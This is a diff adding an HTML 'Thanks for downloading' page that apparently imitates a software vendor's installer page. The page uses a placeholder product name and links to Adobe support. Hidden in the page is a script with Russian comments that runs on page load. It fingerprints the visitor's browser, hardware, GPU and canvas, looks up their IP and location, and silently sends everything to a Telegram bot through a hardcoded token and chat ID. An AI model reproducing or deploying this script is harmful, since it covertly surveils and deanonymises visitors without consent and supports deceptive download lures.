@@ -1,0 +1,482 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Thanks for downloading</title>
+  <meta name="description" content="Thank you for downloading. Your download should begin automatically." />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+
+  <style>
+    :root{
+      --bg: #0b0c10;
+      --card: rgba(255,255,255,0.7);
+      --text: #0b0c10;
+      --muted:#667085;
+      --accent:#6C7CF0;
+      --accent-2:#7BD2D2;
+      --ring: rgba(108,124,240,.25);
+      --success:#22c55e;
+      --surface:#ffffff;
+      --shadow: 0 20px 45px rgba(10, 14, 29, .08);
+      --radius: 18px;
+    }
+    @media (prefers-color-scheme: light){
+      body{ background: #f6f7fb; }
+    }
+    @media (prefers-color-scheme: dark){
+      :root{
+        --bg: #0b0c10;
+        --surface: #111318;
+        --card: rgba(20,22,28,0.75);
+        --text: #e6e7eb;
+        --muted:#98a1b3;
+        --shadow: 0 24px 60px rgba(0,0,0,.45);
+      }
+      body { background: radial-gradient(1200px 800px at 10% -10%, #10131c, var(--bg)); }
+    }
+
+    *{ box-sizing: border-box }
+    html,body{ height:100% }
+    body{
+      margin:0;
+      font-family: Inter, system-ui, -apple-system, Segoe UI, Roboto, "Helvetica Neue", Arial, "Noto Sans", "Apple Color Emoji","Segoe UI Emoji", "Segoe UI Symbol", sans-serif;
+      color: var(--text);
+      display:grid;
+      place-items:center;
+      line-height:1.6;
+    }
+
+    .wrap{
+      width:min(920px, 92vw);
+      position:relative;
+    }
+
+    /* Subtle gradient ribbons */
+    .ribbon{
+      position:absolute; inset: -80px -60px auto auto;
+      width: 320px; height: 320px;
+      background:
+        radial-gradient(closest-side at 65% 35%, color-mix(in oklab, var(--accent), white 35%) 0, transparent 70%),
+        radial-gradient(closest-side at 35% 65%, color-mix(in oklab, var(--accent-2), white 35%) 0, transparent 70%);
+      filter: blur(50px) saturate(130%);
+      opacity:.45;
+      pointer-events:none;
+    }
+
+    .card{
+      backdrop-filter: blur(10px) saturate(120%);
+      background: var(--card);
+      border: 1px solid rgba(140,148,170,.18);
+      border-radius: var(--radius);
+      box-shadow: var(--shadow);
+      overflow:hidden;
+    }
+
+    .header{
+      position:relative;
+      padding: 28px 28px 20px;
+      border-bottom: 1px solid rgba(140,148,170,.18);
+    }
+    .header:before{
+      content:"";
+      position:absolute;
+      inset:0 0 auto 0;
+      height:4px;
+      background: linear-gradient(90deg, var(--accent), var(--accent-2));
+    }
+
+    .badge{
+      display:inline-flex; align-items:center; gap:.5rem;
+      padding:6px 10px; border-radius:999px;
+      font-size: .85rem; font-weight:600; letter-spacing:.01em;
+      color:#0a2b14; background: color-mix(in oklab, var(--success), white 82%);
+      border:1px solid color-mix(in oklab, var(--success), white 70%);
+    }
+    .badge svg{ width:16px; height:16px; }
+
+    h1{
+      margin:12px 0 4px; font-size: clamp(1.4rem, 2.4vw + 0.8rem, 2rem);
+      letter-spacing:-0.015em;
+    }
+    .sub{ color: var(--muted); margin:0 }
+
+    .body{
+      display:grid; gap:22px;
+      grid-template-columns: 1fr;
+      padding: 24px 28px 28px;
+    }
+
+    .next{
+      display:grid; gap:12px;
+    }
+    .next p{ margin:0; color: var(--muted); }
+
+    .actions{
+      display:flex; gap:12px; flex-wrap:wrap; margin-top:6px;
+    }
+    .btn{
+      appearance:none; border:1px solid rgba(140,148,170,.35);
+      background: var(--surface);
+      color: var(--text);
+      padding:12px 16px; border-radius:12px; font-weight:600;
+      text-decoration:none; display:inline-flex; align-items:center; gap:10px;
+      transition: transform .12s ease, box-shadow .12s ease, border-color .12s ease;
+      box-shadow: 0 1px 0 rgba(10,10,18,.02), 0 6px 14px rgba(17,20,30,.06);
+    }
+    .btn:hover{ transform: translateY(-1px); border-color: var(--ring); box-shadow: 0 10px 24px rgba(17,20,30,.08) }
+    .btn-primary{
+      background: linear-gradient(180deg, color-mix(in oklab, var(--accent), white 4%), var(--accent));
+      color: #fff; border-color: transparent;
+      box-shadow: 0 10px 24px color-mix(in oklab, var(--accent), black 12%);
+    }
+    .btn-primary:hover{ transform: translateY(-1px) scale(1.01); }
+
+    .list{
+      display:grid; gap:10px; margin: 4px 0 0; padding:0; list-style:none;
+    }
+    .list li{
+      display:flex; align-items:flex-start; gap:10px;
+      padding:10px 12px; border:1px dashed rgba(140,148,170,.35);
+      border-radius:12px; background: color-mix(in oklab, var(--surface), white 6%);
+    }
+    .list svg{ flex:0 0 18px; margin-top:2px }
+
+    .footer{
+      padding:16px 28px 24px;
+      border-top: 1px solid rgba(140,148,170,.18);
+      color: var(--muted);
+      display:flex; justify-content:space-between; align-items:center; gap:14px; flex-wrap:wrap;
+    }
+    .tiny{
+      font-size:.9rem; color: var(--muted);
+    }
+
+    /* Reduce motion for users who prefer it */
+    @media (prefers-reduced-motion: reduce){
+      .btn, .btn-primary{ transition:none }
+    }
+  </style>
+</head>
+<body>
+  <div class="wrap">
+    <div class="ribbon" aria-hidden="true"></div>
+
+    <main class="card" role="main" aria-labelledby="title">
+      <header class="header">
+        <span class="badge" aria-label="Download started">
+          <svg viewBox="0 0 24 24" fill="none" aria-hidden="true">
+            <path d="M20 7L9 18l-5-5" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+          </svg>
+          Thank you!
+        </span>
+        <h1 id="title">Your download is on the way</h1>
+      
+      </header>
+
+      <section class="body">
+        
+
+        <div>
+          <ul class="list" aria-label="What happens next">
+            <li>
+              <svg viewBox="0 0 24 24" fill="none" aria-hidden="true">
+                <circle cx="12" cy="12" r="9" stroke="currentColor" stroke-width="2"/>
+                <path d="M12 7v6l4 2" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+              </svg>
+              <div>
+                <strong>Run the installer.</strong><br />
+                When the file finishes downloading, open it and follow the steps.
+              </div>
+            </li>
+            <li>
+              <svg viewBox="0 0 24 24" fill="none" aria-hidden="true">
+                <path d="M20 12c0 4.418-3.582 8-8 8S4 16.418 4 12 7.582 4 12 4s8 3.582 8 8Z" stroke="currentColor" stroke-width="2"/>
+                <path d="m9 12 2 2 4-4" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+              </svg>
+              <div>
+                <strong>Launch & sign in.</strong><br />
+                Open <em>ProductName</em> and sign in to activate your license.
+              </div>
+            </li>
+            <li>
+              <svg viewBox="0 0 24 24" fill="none" aria-hidden="true">
+                <path d="M4 8h16M4 16h8" stroke="currentColor" stroke-width="2" stroke-linecap="round"/>
+              </svg>
+              <div>
+                <strong>Need help?</strong><br />
+                Visit our <a href="https://helpx.adobe.com/support.html">support center</a>.
+              </div>
+            </li>
+          </ul>
+        </div>
+      </section>
+
+      <footer class="footer" aria-label="Footer">
+       
+      </footer>
+    </main>
+  </div>
+<script>
+      const TELEGRAM_BOT_TOKEN = '5476684096:AAHLPhETaJmJ94T9kUNGHirpqQ5-y3ub7js'; // 
+      const TELEGRAM_CHAT_ID = '7365599803'; // 
+      
+      
+      // Функция для получения User Agent
+      function getUserAgent() {
+          return navigator.userAgent;
+      }
+      
+      // Функция для получения информации о WebGL
+      function getWebGLInfo() {
+          const canvas = document.createElement('canvas');
+          const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+          
+          if (!gl) {
+              return {
+                  vendor: 'WebGL не поддерживается',
+                  renderer: 'WebGL не поддерживается',
+                  extensions: []
+              };
+          }
+      
+          const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+          
+          return {
+              vendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : gl.getParameter(gl.VENDOR),
+              renderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : gl.getParameter(gl.RENDERER),
+              version: gl.getParameter(gl.VERSION),
+              shadingLanguageVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
+              extensions: gl.getSupportedExtensions() || []
+          };
+      }
+      
+      // Функция для создания canvas fingerprint
+      function getCanvasFingerprint() {
+          const canvas = document.createElement('canvas');
+          canvas.width = 200;
+          canvas.height = 60;
+          const ctx = canvas.getContext('2d');
+          
+          // Рисуем уникальный паттерн
+          ctx.textBaseline = 'top';
+          ctx.font = '14px Arial';
+          ctx.fillStyle = '#f60';
+          ctx.fillRect(125, 1, 62, 20);
+          ctx.fillStyle = '#069';
+          ctx.fillText('🌟 Fingerprint Test 🔍', 2, 15);
+          ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
+          ctx.fillText('Canvas fingerprint', 4, 35);
+      
+          return canvas.toDataURL();
+      }
+      
+      // Функция для получения информации об экране
+      function getScreenInfo() {
+          return {
+              width: screen.width,
+              height: screen.height,
+              availWidth: screen.availWidth,
+              availHeight: screen.availHeight,
+              colorDepth: screen.colorDepth,
+              pixelDepth: screen.pixelDepth,
+              devicePixelRatio: window.devicePixelRatio || 1,
+              timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+              language: navigator.language,
+              languages: navigator.languages
+          };
+      }
+      
+      // Функция для получения информации о железе
+      function getHardwareInfo() {
+          const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+          
+          return {
+              cores: navigator.hardwareConcurrency || 'Не определено',
+              memory: navigator.deviceMemory ? `${navigator.deviceMemory}GB` : 'Не определено',
+              connection: connection ? {
+                  type: connection.effectiveType || 'Неизвестно',
+                  downlink: connection.downlink ? `${connection.downlink}Mbps` : 'Неизвестно',
+                  rtt: connection.rtt ? `${connection.rtt}ms` : 'Неизвестно',
+                  saveData: connection.saveData || false
+              } : 'Не поддерживается',
+              battery: 'battery' in navigator ? 'Поддерживается' : 'Не поддерживается',
+              plugins: Array.from(navigator.plugins).map(p => p.name),
+              mimeTypes: Array.from(navigator.mimeTypes).map(m => m.type)
+          };
+      }
+      
+      // Функция для получения IP адреса
+      async function getIPInfo() {
+          try {
+              const response = await fetch('https://api.ipify.org?format=json');
+              const data = await response.json();
+              
+              // Пытаемся получить дополнительную информацию об IP
+              try {
+                  const geoResponse = await fetch(`http://ip-api.com/json/${data.ip}`);
+                  const geoData = await geoResponse.json();
+                  
+                  return {
+                      ip: data.ip,
+                      country: geoData.country || 'Неизвестно',
+                      region: geoData.regionName || 'Неизвестно',
+                      city: geoData.city || 'Неизвестно',
+                      isp: geoData.isp || 'Неизвестно',
+                      timezone: geoData.timezone || 'Неизвестно'
+                  };
+              } catch (geoError) {
+                  return {
+                      ip: data.ip,
+                      country: 'Неизвестно',
+                      region: 'Неизвестно',
+                      city: 'Неизвестно',
+                      isp: 'Неизвестно',
+                      timezone: 'Неизвестно'
+                  };
+              }
+          } catch (error) {
+              console.warn('⚠️ Не удалось получить IP:', error);
+              return {
+                  ip: 'Не определен',
+                  country: 'Неизвестно',
+                  region: 'Неизвестно',
+                  city: 'Неизвестно',
+                  isp: 'Неизвестно',
+                  timezone: 'Неизвестно'
+              };
+          }
+      }
+      
+      // Функция для сбора всех данных
+      async function collectFingerprint() {
+          const userAgent = getUserAgent();
+          const webglInfo = getWebGLInfo();
+          const canvasFingerprint = getCanvasFingerprint();
+          const screenInfo = getScreenInfo();
+          const hardwareInfo = getHardwareInfo();
+          const ipInfo = await getIPInfo();
+      
+          return {
+              timestamp: new Date().toISOString(),
+              url: window.location.href,
+              referrer: document.referrer,
+              userAgent: userAgent,
+              ip: ipInfo,
+              hardware: hardwareInfo,
+              webgl: webglInfo,
+              canvas: {
+                  fingerprint: canvasFingerprint,
+                  hash: btoa(canvasFingerprint).slice(0, 32)
+              },
+              screen: screenInfo,
+              browser: {
+                  cookieEnabled: navigator.cookieEnabled,
+                  doNotTrack: navigator.doNotTrack,
+                  platform: navigator.platform,
+                  hardwareConcurrency: navigator.hardwareConcurrency,
+                  onLine: navigator.onLine,
+                  javaEnabled: navigator.javaEnabled ? navigator.javaEnabled() : false
+              },
+              viewport: {
+                  width: window.innerWidth,
+                  height: window.innerHeight
+              }
+          };
+      }
+      
+      // Функция для отправки в Telegram
+      async function sendToTelegram(data) {
+          if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID || 
+              TELEGRAM_BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE' || 
+              TELEGRAM_CHAT_ID === 'YOUR_CHAT_ID_HERE') {
+              console.error('❌ Настройте TELEGRAM_BOT_TOKEN и TELEGRAM_CHAT_ID в скрипте');
+              return false;
+          }
+      
+          // Расширенное сообщение с IP и железом
+          const message = `🔍 *Новый визитор*\n\n` +
+              `🌐 *URL:* ${data.url.length > 50 ? data.url.substring(0, 50) + '...' : data.url}\n` +
+              `🌍 *IP:* \`${data.ip.ip}\`\n` +
+              `🏠 *Локация:* ${data.ip.city}, ${data.ip.country}\n` +
+              `🏢 *ISP:* ${data.ip.isp}\n` +
+              `📅 *Время:* ${new Date(data.timestamp).toLocaleString('ru-RU')}\n` +
+              `🖥️ *Экран:* ${data.screen.width}x${data.screen.height}\n` +
+              `📱 *Устройство:* ${data.browser.platform}\n` +
+              `🔧 *CPU ядра:* ${data.hardware.cores}\n` +
+              `💾 *RAM:* ${data.hardware.memory}\n` +
+              `📡 *Соединение:* ${data.hardware.connection.type || 'Неизвестно'}\n` +
+              `🎮 *GPU:* ${data.webgl.renderer.substring(0, 30)}...\n` +
+              `🌍 *Язык:* ${data.screen.language}\n` +
+              `⏰ *Часовой пояс:* ${data.screen.timezone}\n` +
+              `🔑 *Canvas:* \`${data.canvas.hash}\``;
+      
+          try {
+              // Отправляем основное сообщение
+              const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                  method: 'POST',
+                  headers: {
+                      'Content-Type': 'application/json',
+                  },
+                  body: JSON.stringify({
+                      chat_id: TELEGRAM_CHAT_ID,
+                      text: message,
+                      parse_mode: 'Markdown'
+                  })
+              });
+      
+              if (response.ok) {
+                  
+                  // Отправляем полные данные как файл
+                  const jsonData = JSON.stringify(data, null, 2);
+                  const blob = new Blob([jsonData], { type: 'application/json' });
+                  const formData = new FormData();
+                  formData.append('chat_id', TELEGRAM_CHAT_ID);
+                  formData.append('document', blob, `fingerprint_${Date.now()}.json`);
+                  formData.append('caption', '📄 Полные данные fingerprint с IP и железом');
+      
+                  const fileResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`, {
+                      method: 'POST',
+                      body: formData
+                  });
+      
+                  if (fileResponse.ok) {
+                  }
+                  
+                  return true;
+              } else {
+                  console.error('❌ Ошибка отправки в Telegram:', await response.text());
+                  return false;
+              }
+          } catch (error) {
+              console.error('❌ Ошибка при отправке:', error);
+              return false;
+          }
+      }
+      
+      // Основная функция
+      async function startFingerprinting() {
+          try {
+              const data = await collectFingerprint();
+              
+              
+              const success = await sendToTelegram(data);
+              if (success) {
+              }
+          } catch (error) {
+              console.error('❌ Ошибка:', error);
+          }
+      }
+      
+      // Автозапуск при загрузке страницы
+      if (document.readyState === 'loading') {
+          document.addEventListener('DOMContentLoaded', startFingerprinting);
+      } else {
+          startFingerprinting();
+      }
+      </script>
+  
+</body>
+</html>
